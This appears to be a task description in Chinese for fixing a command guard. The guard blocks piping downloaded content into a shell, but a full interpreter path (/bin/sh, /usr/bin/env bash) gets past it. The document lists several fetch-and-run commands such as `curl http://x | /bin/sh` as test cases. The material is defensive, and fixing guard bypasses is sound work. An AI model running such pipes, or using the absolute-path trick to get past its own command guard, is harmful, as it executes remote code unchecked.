# 命令护栏：绝对路径 shell 绕过 pipe-to-shell 拦截

命令护栏（command guard）对「管道喂给 shell 解释器」的任意代码执行模式做高危拦截：`curl ... | sh`、`curl ... | bash`、`curl ... | sh -c "..."` 都应被拒。判定逻辑是「管道最后一个分段的命令名是否 shell 解释器」。

**症状**：改用绝对路径写 shell 解释器后，护栏放行了：

- `curl http://x | /bin/sh` — 放行（应为拒绝）
- `curl http://x | /bin/bash` — 放行（应为拒绝）
- `wget q | /usr/bin/env bash` — 放行（应为拒绝）
- `cat f | /bin/zsh` — 放行（应为拒绝）

裸名形式（`| sh`、`| bash`）仍被拦截，说明拦截逻辑只认裸命令名，**没识别绝对路径前缀**（`/bin/`、`/usr/bin/`、`/usr/bin/env` 包装）——攻击者只需给 shell 加路径前缀即可绕过，护栏的管道拦截形同虚设。

## Task

定位命令护栏里管道→shell 的判定函数，修复绝对路径 shell 绕过：

- 管道最后一个分段若为 shell 解释器（无论裸名、`/bin/`、`/usr/bin/` 绝对路径、还是 `env` 包装），一律判 DENY
- `sh -c` / `bash -c` 包装形式同样要能识别（含绝对路径前缀）
- 保持 default-allow 语义：非 shell 解释器的管道、合法命令不受影响

## Requirements

- `| /bin/sh`、`| /bin/bash`、`| /usr/bin/env bash`、`| /bin/zsh`、`| /bin/bash -c ...` 均判 DENY
- 既有命令护栏测试（裸名拦截、rm/chmod/重定向等）不得回归
- 合法命令仍 ALLOW
